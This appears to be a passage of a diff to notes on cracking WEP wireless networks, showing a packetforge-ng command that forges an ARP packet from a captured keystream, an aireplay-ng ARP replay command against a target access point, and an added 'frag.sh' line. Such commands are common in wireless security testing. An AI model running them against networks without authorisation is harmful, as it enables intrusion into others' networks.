@@ -14,3 +14,5 @@ packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.
 THen replay the .cap file to generate traffic
 
 aireplay-ng -3 -b $ap_mac -h $local_mac -r output.cap $interface
+
+frag.sh
